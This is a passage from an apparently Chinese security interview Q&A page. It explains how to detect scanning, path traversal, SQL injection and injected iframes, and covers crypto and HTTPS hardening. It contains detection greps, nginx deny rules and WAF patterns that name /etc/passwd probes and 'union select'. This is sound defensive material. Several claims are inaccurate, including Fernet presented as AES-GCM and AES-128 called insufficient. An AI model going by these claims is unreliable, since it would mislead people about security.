/var/log/dnsmasq.log</span><br></pre></td></tr></table></figure></li><li>访问特定安全机制，如 <code>.well-known/security.txt</code>。</li></ul><p><strong>防御方法</strong>：</p><ul><li>启用 <strong>DNS 速率限制</strong>，防止大规模子域枚举：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p udp --dport 53 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 10/s -j ACCEPT</span><br></pre></td></tr></table></figure></li><li>监控 DNS 查询日志，发现异常域名解析行为。</li></ul><hr><h3 id="如何准确识别端口探测？"><a href="#如何准确识别端口探测？" class="headerlink" title="如何准确识别端口探测？"></a><strong>如何准确识别端口探测？</strong></h3><p><strong>端口探测特征</strong>：</p><ol><li><strong>单个 IP 访问多个端口</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;SYN&quot;</span> /var/log/firewall.log | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure></li><li><strong>异常速率</strong>：<ul><li>短时间内出现大量 <code>SYN</code> 请求。</li></ul></li></ol><p><strong>防御方法</strong>：</p><ul><li>配置 <code>iptables</code> 限制扫描行为：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --syn -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 5/s -j ACCEPT</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="如何准确识别文件遍历探测？"><a href="#如何准确识别文件遍历探测？" class="headerlink" title="如何准确识别文件遍历探测？"></a><strong>如何准确识别文件遍历探测？</strong></h3><p><strong>常见特征</strong>：</p><ul><li>访问 <code>/etc/passwd</code>、<code>/proc/self/environ</code> 等敏感文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;passwd&quot;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure></li><li>URL 结尾包含 <code>../</code>、<code>..%2f</code>（路径遍历编码）。</li></ul><p><strong>防御措施</strong>：</p><ul><li>在 <code>Nginx</code> 配置禁止目录遍历：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ &quot;\.\.&quot;</span> &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="SQL-注入拦截规则如何实现？"><a href="#SQL-注入拦截规则如何实现？" class="headerlink" title="SQL 注入拦截规则如何实现？"></a><strong>SQL 注入拦截规则如何实现？</strong></h3><p><strong>常见 SQL 注入特征</strong>：</p><ul><li>发现 <code>UNION SELECT</code>、<code>ORDER BY</code> 关键词。</li><li>URL 包含 <code>--</code>、<code>#</code>（SQL 注释）。</li></ul><p><strong>拦截方式</strong>：</p><ul><li><strong>WAF 规则</strong>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$query_string</span> <span class="regexp">~ &quot;union.*select&quot;)</span> &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>数据库安全策略</strong>：<ul><li>采用 <strong>参数化查询</strong>，避免拼接 SQL：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE id = %s&quot;</span>, (user_id,))</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h3 id="如何实现页面篡改感知？"><a href="#如何实现页面篡改感知？" class="headerlink" title="如何实现页面篡改感知？"></a><strong>如何实现页面篡改感知？</strong></h3><p><strong>检测方法</strong>：</p><ol><li><strong>定期对比页面哈希值</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> index.html</span><br></pre></td></tr></table></figure></li><li><strong>启用 Content Security Policy（CSP）</strong>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;default-src &#x27;self&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><strong>利用 <code>Selenium</code> 监测页面 DOM 变化</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">&quot;//script[contains(text(),&#x27;malicious&#x27;)]&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="如何实现页面挂马感知？"><a href="#如何实现页面挂马感知？" class="headerlink" title="如何实现页面挂马感知？"></a><strong>如何实现页面挂马感知？</strong></h3><p><strong>挂马检测方式</strong>：</p><ol><li><strong>定期扫描 <code>script</code> 标签，发现异常 URL</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;&lt;script src=&quot;</span> /var/www/html/index.html</span><br></pre></td></tr></table></figure></li><li><strong>检测恶意 <code>iframe</code> 注入</strong>：<ul><li>监测 <code>&lt;iframe&gt;</code> 指向未知域名：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html_content, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> iframe <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;iframe&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;attack.com&quot;</span> <span class="keyword">in</span> iframe[<span class="string">&#x27;src&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Malicious iframe detected!&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="如何确保线上拦截规则不出现误拦截？"><a href="#如何确保线上拦截规则不出现误拦截？" class="headerlink" title="如何确保线上拦截规则不出现误拦截？"></a><strong>如何确保线上拦截规则不出现误拦截？</strong></h3><p><strong>误拦截分析</strong>：</p><ol><li><strong>回放拦截日志</strong>，分析被拦截请求：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/nginx/access.log | grep <span class="string">&quot;403&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>灰度测试</strong>：<ul><li>先在 <strong>镜像流量环境</strong> 中测试规则，确保不会影响正常流量。</li></ul></li><li><strong>结合 AI 风控</strong>：<ul><li>通过 <strong>异常分数计算</strong> 识别误报：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> IsolationForest</span><br><span class="line">model = IsolationForest()</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="如何识别公共和私有接口？"><a href="#如何识别公共和私有接口？" class="headerlink" title="如何识别公共和私有接口？"></a><strong>如何识别公共和私有接口？</strong></h3><ol><li><strong>根据 API 路由模式</strong>：<ul><li><code>/api/public/</code> 可能为公共接口。</li><li><code>/admin/</code> 可能为私有接口。</li></ul></li><li><strong>基于鉴权检测</strong>：<ul><li>发送请求，无 Token 仍返回 200，则可能为公共接口。</li></ul></li></ol><hr><h3 id="如何识别机器行为请求？"><a href="#如何识别机器行为请求？" class="headerlink" title="如何识别机器行为请求？"></a><strong>如何识别机器行为请求？</strong></h3><p><strong>机器请求特征</strong>：</p><ol><li><strong>User-Agent 异常</strong>：<ul><li>爬虫通常使用 <code>curl</code>、<code>Python-requests</code>。</li></ul></li><li><strong>请求频率异常</strong>：<ul><li>短时间内大量请求：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> /var/log/nginx/access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>行为模式异常</strong>：<ul><li>正常用户不会 <strong>连续点击多个页面</strong>。</li></ul></li></ol><p><strong>检测方式</strong>：</p><ul><li>结合 <strong>CAPTCHA</strong> 进行验证。</li><li>采用 <strong>行为指纹分析</strong>（鼠标轨迹、人机交互）。</li></ul><hr><h3 id="如何感知被动风险？"><a href="#如何感知被动风险？" class="headerlink" title="如何感知被动风险？"></a><strong>如何感知被动风险？</strong></h3><ol><li><strong>监测被动 DNS</strong>：<ul><li>发现是否有恶意域名解析：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;badsite.com&quot;</span> /var/log/dnsmasq.log</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>流量侧感知</strong>：<ul><li>被动分析流量，检测 C2 通信：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bro -r capture.pcap</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>威胁情报关联</strong>：<ul><li>结合 <code>Threat Intelligence</code>，匹配恶意 IP 访问日志。</li></ul></li></ol><hr><h3 id="如何判断攻击请求是定点攻击还是随机扫描？"><a href="#如何判断攻击请求是定点攻击还是随机扫描？" class="headerlink" title="如何判断攻击请求是定点攻击还是随机扫描？"></a><strong>如何判断攻击请求是定点攻击还是随机扫描？</strong></h3><p><strong>定点攻击</strong>：</p><ul><li>针对 <strong>特定 URL</strong>，如 <code>/admin/login</code>，长期攻击同一接口。</li><li>目标明确，通常伴随 <strong>密码爆破</strong> 或 <strong>业务滥用</strong>。</li></ul><p><strong>随机扫描</strong>：</p><ul><li>短时间内访问多个 URL，类似 <code>dirb</code>、<code>gobuster</code> 行为：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;404&quot;</span> /var/log/nginx/access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br></pre></td></tr></table></figure></li><li>目标模糊，尝试 <strong>路径遍历、子域名爆破</strong>。</li></ul><hr><h3 id="如何识别客户端的系统真实类型？"><a href="#如何识别客户端的系统真实类型？" class="headerlink" title="如何识别客户端的系统真实类型？"></a><strong>如何识别客户端的系统真实类型？</strong></h3><h2 id="检测方法：1-基于-User-Agent-：-2-JS-指纹识别：-通过-navigator-platform-获取系统类型：-3-TLS-指纹分析：-通过-JA3-识别系统特征："><a href="#检测方法：1-基于-User-Agent-：-2-JS-指纹识别：-通过-navigator-platform-获取系统类型：-3-TLS-指纹分析：-通过-JA3-识别系统特征：" class="headerlink" title="检测方法：1. **基于 User-Agent**：   2. JS 指纹识别：   - 通过 navigator.platform 获取系统类型：     3. TLS 指纹分析：   - 通过 JA3 识别系统特征：     "></a><strong>检测方法</strong>：<br>1. **基于 <code>User-Agent</code>**：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Windows NT&quot;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure><br>2. <strong>JS 指纹识别</strong>：<br>   - 通过 <code>navigator.platform</code> 获取系统类型：<br>     <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(navigator.<span class="property">platform</span>);</span><br></pre></td></tr></table></figure><br>3. <strong>TLS 指纹分析</strong>：<br>   - 通过 <strong>JA3</strong> 识别系统特征：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ja3 -r capture.pcap</span><br></pre></td></tr></table></figure></h2><h3 id="有哪些可以收集的情报渠道？"><a href="#有哪些可以收集的情报渠道？" class="headerlink" title="有哪些可以收集的情报渠道？"></a><strong>有哪些可以收集的情报渠道？</strong></h3><p><strong>威胁情报来源</strong>：</p><ol><li><strong>开源情报（OSINT）</strong>：<ul><li><code>Shodan</code>、<code>Censys</code> 发现暴露的企业资产。</li><li><code>Twitter</code>、<code>Telegram</code> 监控黑客讨论。</li></ul></li><li><strong>商业情报</strong>：<ul><li>订阅 <code>Recorded Future</code>、<code>CrowdStrike</code> 提供的情报数据。</li></ul></li><li><strong>暗网情报</strong>：<ul><li>监控 <code>Tor</code>、<code>I2P</code> 发现泄露数据。</li></ul></li><li><strong>蜜罐数据</strong>：<ul><li>通过 <code>Cowrie</code> 捕获攻击者行为，分析 C2 服务器地址。</li></ul></li></ol><hr><h3 id="如何快速筛选出最新的-CVE-对我们是否有实际影响？"><a href="#如何快速筛选出最新的-CVE-对我们是否有实际影响？" class="headerlink" title="如何快速筛选出最新的 CVE 对我们是否有实际影响？"></a><strong>如何快速筛选出最新的 CVE 对我们是否有实际影响？</strong></h3><p><strong>筛选步骤</strong>：</p><ol><li><strong>解析 CVE 影响范围</strong>：<ul><li>关注 <code>CWE</code> 分类（如 <code>CWE-79</code> 代表 XSS）。</li></ul></li><li><strong>比对自身资产</strong>：<ul><li>检查企业内部使用的软件版本：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep openssl</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>PoC 复现测试</strong>：<ul><li>运行 <code>Exploit-DB</code> 或 <code>Metasploit</code> 进行验证：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit CVE-2024-1234</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="给定一个网址，如何自动化识别其是否为钓鱼网站？"><a href="#给定一个网址，如何自动化识别其是否为钓鱼网站？" class="headerlink" title="给定一个网址，如何自动化识别其是否为钓鱼网站？"></a><strong>给定一个网址，如何自动化识别其是否为钓鱼网站？</strong></h3><p><strong>识别步骤</strong>：</p><ol><li><strong>域名相似性分析</strong>：<ul><li>计算 <code>Levenshtein 距离</code>，检测是否模仿官方域名：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fuzzywuzzy <span class="keyword">import</span> fuzz</span><br><span class="line">fuzz.ratio(<span class="string">&quot;paypa1.com&quot;</span>, <span class="string">&quot;paypal.com&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>证书分析</strong>：<ul><li>检测 HTTPS 证书签发方，钓鱼站常使用 <code>Let&#39;s Encrypt</code> 证书。</li></ul></li><li><strong>页面内容特征</strong>：<ul><li>使用 <code>Selenium</code> 获取网站截图，与官方站点比对 UI 相似度。</li></ul></li></ol><hr><h3 id="如何识别仿冒-APP？"><a href="#如何识别仿冒-APP？" class="headerlink" title="如何识别仿冒 APP？"></a><strong>如何识别仿冒 APP？</strong></h3><p><strong>检测方法</strong>：</p><ol><li><strong>签名校验</strong>：<ul><li>通过 <code>apksigner</code> 检测 APK 签名：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apksigner verify --print-certs fake_app.apk</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>动态行为分析</strong>：<ul><li>使用 <code>Frida</code> Hook API，检测是否存在异常权限请求：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line">session = frida.get_usb_device().attach(<span class="string">&quot;fake_app&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>市场监控</strong>：<ul><li>在 <code>Google Play</code>、<code>第三方应用商店</code> 监控相似 APP。</li></ul></li></ol><hr><h3 id="如何识别一个没有登陆的用户真实身份？"><a href="#如何识别一个没有登陆的用户真实身份？" class="headerlink" title="如何识别一个没有登陆的用户真实身份？"></a><strong>如何识别一个没有登陆的用户真实身份？</strong></h3><p><strong>识别方法</strong>：</p><ol><li><strong>基于指纹识别</strong>：<ul><li>采集浏览器 <code>Canvas Fingerprint</code>、<code>User-Agent</code> 等特征。</li></ul></li><li><strong>基于行为分析</strong>：<ul><li>监测鼠标移动轨迹，AI 识别人类 vs 机器人：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">clientX</span>, e.<span class="property">clientY</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>IP 地址溯源</strong>：<ul><li>使用 <code>MaxMind</code> 库识别用户 IP 归属地。</li></ul></li></ol><hr><h3 id="如何找出对我们业务实施网络攻击的黑客真实身份？"><a href="#如何找出对我们业务实施网络攻击的黑客真实身份？" class="headerlink" title="如何找出对我们业务实施网络攻击的黑客真实身份？"></a><strong>如何找出对我们业务实施网络攻击的黑客真实身份？</strong></h3><p><strong>溯源方法</strong>：</p><ol><li><strong>IP 反查</strong>：<ul><li>通过 <code>whois</code> 查询攻击者 IP 归属：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois &lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>蜜罐捕获</strong>：<ul><li>使用 <code>T-Pot</code> 蜜罐收集攻击者行为模式。</li></ul></li></ol><hr><h3 id="国内和国外攻击特点有什么区别？"><a href="#国内和国外攻击特点有什么区别？" class="headerlink" title="国内和国外攻击特点有什么区别？"></a><strong>国内和国外攻击特点有什么区别？</strong></h3><table><thead><tr><th><strong>对比项</strong></th><th><strong>国内攻击</strong></th><th><strong>国外攻击</strong></th></tr></thead><tbody><tr><td><strong>攻击手法</strong></td><td>业务滥用、供应链攻击</td><td>APT、高级恶意软件</td></tr><tr><td><strong>工具</strong></td><td>国内木马、Cobalt Strike</td><td>Metasploit、Empire</td></tr><tr><td><strong>目标</strong></td><td>金融、电商、政企系统</td><td>基础设施、政府机构</td></tr><tr><td><strong>攻击目的</strong></td><td>经济利益、数据窃取</td><td>国家级间谍活动</td></tr><tr><td><strong>攻击溯源</strong></td><td>攻击 IP 多变，难溯源</td><td>APT 组织痕迹明显</td></tr></tbody></table><p><strong>总结</strong>：</p><ul><li><strong>国内攻击者</strong> 偏向于经济驱动型（如诈骗、钓鱼、撞库）。</li><li><strong>国外 APT 组织</strong> 更倾向于 <strong>长期潜伏</strong>，目标往往是 <strong>情报窃取</strong>。</li></ul><hr><h3 id="常见加解密分类和算法有哪些？"><a href="#常见加解密分类和算法有哪些？" class="headerlink" title="常见加解密分类和算法有哪些？"></a><strong>常见加解密分类和算法有哪些？</strong></h3><table><thead><tr><th><strong>类型</strong></th><th><strong>国际算法</strong></th><th><strong>国密算法</strong></th></tr></thead><tbody><tr><td><strong>对称加密</strong></td><td>AES、DES</td><td>SM4</td></tr><tr><td><strong>非对称加密</strong></td><td>RSA、ECDSA、ECDH</td><td>SM2</td></tr><tr><td><strong>消息摘要算法</strong></td><td>SHA256、MD5</td><td>SM3</td></tr><tr><td><strong>传输层安全协议</strong></td><td>TLS、SSL</td><td>TLS1.3 + 国密单证书</td></tr><tr><td><strong>国密证书</strong></td><td>sha*WithRsaEncryption</td><td>SM2-with-SM3</td></tr></tbody></table><hr><h3 id="哪些-Hash-和加密算法不建议使用？"><a href="#哪些-Hash-和加密算法不建议使用？" class="headerlink" title="哪些 Hash 和加密算法不建议使用？"></a><strong>哪些 Hash 和加密算法不建议使用？</strong></h3><p><strong>不建议使用的算法</strong>：</p><ol><li><p><strong>已被破解</strong>：</p><ul><li><strong>MD5</strong>（碰撞攻击已被实现）</li><li><strong>SHA1</strong>（已存在实用级攻击）</li><li><strong>RC4</strong>（TLS 已弃用）</li><li><strong>DES</strong>（密钥长度过短）</li></ul></li><li><p><strong>安全性不足</strong>：</p><ul><li><strong>3DES</strong>（密钥长度 168-bit，但攻击复杂度已降低）</li><li><strong>RSA 1024-bit</strong>（建议使用 2048-bit 或以上）</li><li><strong>AES 128-bit</strong>（可使用 AES-256 提高安全性）</li></ul></li></ol><p><strong>推荐使用的算法</strong>：</p><ul><li><strong>对称加密</strong>：AES-256</li><li><strong>非对称加密</strong>：RSA-4096、ECC（如 Curve25519）</li><li><strong>Hash 算法</strong>：SHA-256 及以上</li></ul><hr><h3 id="硬编码密钥如何解决？"><a href="#硬编码密钥如何解决？" class="headerlink" title="硬编码密钥如何解决？"></a><strong>硬编码密钥如何解决？</strong></h3><p><strong>风险</strong>：</p><ul><li>硬编码密钥会被代码审计工具（如 <code>GitLeaks</code>、<code>TruffleHog</code>）检测并泄露。</li></ul><p><strong>解决方案</strong>：</p><ol><li><strong>环境变量存储密钥</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> API_KEY=<span class="string">&quot;your-secret-key&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>使用 KMS（密钥管理系统）</strong>：<ul><li>AWS KMS、HashiCorp Vault 进行密钥管理</li></ul></li><li><strong>定期轮换密钥</strong>：<ul><li>避免长期使用同一密钥，降低泄露风险。</li></ul></li></ol><hr><h3 id="PKI-原理"><a href="#PKI-原理" class="headerlink" title="PKI 原理"></a><strong>PKI 原理</strong></h3><p><strong>PKI（公钥基础设施）工作机制</strong>：</p><ol><li><strong>密钥对</strong>：每个用户有 <strong>公钥 + 私钥</strong>（RSA&#x2F;ECC）。</li><li><strong>证书</strong>：由 <strong>CA（证书颁发机构）</strong> 签发，确保公钥可信。</li><li><strong>证书链</strong>：通过 <strong>根 CA -&gt; 中间 CA -&gt; 服务器证书</strong> 形成信任链。</li></ol><p><strong>应用场景</strong>：</p><ul><li><strong>SSL&#x2F;TLS</strong> 证书认证（HTTPS）</li><li><strong>数字签名</strong> 确保数据完整性</li></ul><hr><h3 id="国密的底层原理？"><a href="#国密的底层原理？" class="headerlink" title="国密的底层原理？"></a><strong>国密的底层原理？</strong></h3><p><strong>国密算法（SM 系列）特点</strong>：</p><ol><li><strong>SM2（非对称加密）</strong>：<ul><li>替代 RSA，基于椭圆曲线，密钥长度更短但更安全。</li></ul></li><li><strong>SM3（哈希算法）</strong>：<ul><li>替代 SHA256，提供更高抗碰撞性。</li></ul></li><li><strong>SM4（对称加密）</strong>：<ul><li>替代 AES，适用于数据加密。</li></ul></li></ol><p><strong>应用场景</strong>：</p><ul><li><strong>政府、金融机构</strong> 需符合国密标准（如 TLS1.3 + SM2 证书）。</li></ul><hr><h3 id="密码如何保存至数据库？"><a href="#密码如何保存至数据库？" class="headerlink" title="密码如何保存至数据库？"></a><strong>密码如何保存至数据库？</strong></h3><p><strong>最佳实践</strong>：</p><ol><li><strong>使用 PBKDF2 进行哈希</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, os</span><br><span class="line">salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">password_hash = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, password.encode(), salt, <span class="number">100000</span>)</span><br></pre></td></tr></table></figure></li><li><strong>使用 bcrypt&#x2F;scrypt 加密</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcrypt <span class="keyword">import</span> hashpw, gensalt</span><br><span class="line">hashed_password = hashpw(password.encode(), gensalt())</span><br></pre></td></tr></table></figure></li><li><strong>避免明文存储</strong>：<ul><li><strong>禁止使用 MD5、SHA1 直接存储</strong>。</li></ul></li></ol><hr><h3 id="如何让密码轮转？"><a href="#如何让密码轮转？" class="headerlink" title="如何让密码轮转？"></a><strong>如何让密码轮转？</strong></h3><p><strong>密码轮转策略</strong>：</p><ol><li><strong>定期更换密钥</strong>：<ul><li>采用 <strong>密钥版本控制</strong>，新密码使用新密钥加密：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -aes-256-cbc -e -<span class="keyword">in</span> file.txt -out file.enc -K NEW_KEY</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>双重存储机制</strong>：<ul><li><strong>新密码 + 旧密码并存</strong>，避免一次性全量更新：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store_password(user_id, new_hash, old_hash)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>自动化管理</strong>：<ul><li>使用 <strong>KMS（密钥管理系统）</strong> 进行密钥生命周期管理。</li></ul></li></ol><hr><h3 id="可以在哪些层次对文件进行加密？"><a href="#可以在哪些层次对文件进行加密？" class="headerlink" title="可以在哪些层次对文件进行加密？"></a><strong>可以在哪些层次对文件进行加密？</strong></h3><p><strong>加密层次</strong>：</p><ol><li><strong>应用层加密</strong>：<ul><li>采用 <code>AES-GCM</code> 加密文件：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line">key = Fernet.generate_key()</span><br><span class="line">cipher = Fernet(key)</span><br><span class="line">encrypted_data = cipher.encrypt(<span class="string">b&quot;secret data&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>文件系统加密</strong>：<ul><li>Linux <code>eCryptfs</code>，Windows <code>BitLocker</code></li></ul></li><li><strong>磁盘级加密</strong>：<ul><li>通过 <code>LUKS</code> 加密整个磁盘：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cryptsetup luksFormat /dev/sdX</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="如何技术手段实现全站-HTTPS？"><a href="#如何技术手段实现全站-HTTPS？" class="headerlink" title="如何技术手段实现全站 HTTPS？"></a><strong>如何技术手段实现全站 HTTPS？</strong></h3><p><strong>全站 HTTPS 方案</strong>：</p><ol><li><strong>申请 TLS 证书</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certbot --nginx -d example.com</span><br></pre></td></tr></table></figure></li><li><strong>强制跳转 HTTPS</strong>（Nginx 配置）：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>启用 HSTS（HTTP Strict Transport Security）</strong>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;</span><br></pre></td></tr></table></figure></li><li><strong>升级不安全请求</strong>：<ul><li>使用 <code>Content-Security-Policy</code>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;upgrade-insecure-requests&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>检测 HTTPS 配置安全性</strong>：<ul><li>使用 <code>Qualys SSL Labs</code> 测试：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I https://www.ssllabs.com/ssltest/analyze.html?d=example.com</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h2 id="安全蓝军"><a href="#安全蓝军" class="headerlink" title="安全蓝军"></a>安全蓝军</h2><h3 id="如何通过程序判断一批域名是否泛解析域名？"><a href="#如何通过程序判断一批域名是否泛解析域名？" class="headerlink" title="如何通过程序判断一批域名是否泛解析域名？"></a><strong>如何通过程序判断一批域名是否泛解析域名？</strong></h3><p><strong>泛解析检测方法</strong>：</p><ol><li><strong>查询一个不存在的子域名</strong>：<ul><li>例如 <code>random-subdomain.example.com</code>，如果返回 IP，则说明存在泛解析。</li></ul></li><li><strong>比对返回 IP</strong>：<ul><li>解析多个子域名，若 IP 